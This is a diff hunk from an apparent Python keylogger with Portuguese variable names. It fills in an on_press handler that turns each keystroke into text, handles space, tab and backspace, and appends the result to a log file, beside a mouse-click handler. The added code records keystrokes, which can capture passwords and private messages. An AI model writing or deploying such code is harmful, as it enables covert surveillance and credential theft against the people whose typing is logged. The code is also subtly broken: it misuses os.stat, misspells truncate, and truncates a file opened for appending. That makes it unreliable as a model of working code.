@@ -13,8 +13,21 @@ try:
 except:
     pass
 
-def on_press():
-    pass
+def on_press(tecla):
+    tecla = str(tecla)
+    tecla = re.sub(r'\'', '', tecla)
+    tecla = re.sub(r'Key.space', ' ', tecla)
+    tecla = re.sub(r'Key.tab', '\t', tecla)
+    tecla = re.sub(r'Key.backspace', 'apagar', tecla)
+    tecla = re.sub(r'Key.*', '', tecla)
+    with open(arqlog, 'a') as log:
+        if str(tecla) == str(''):
+            if os.stat(arqlog.st_size) != 0:
+                log.seek(0,2)
+                caractere = log.tell()
+                log.truncte(caractere - 1)
+        else:    
+            log.write(tecla)
 
 def on_click(x, y, button, pressed):
     if pressed:
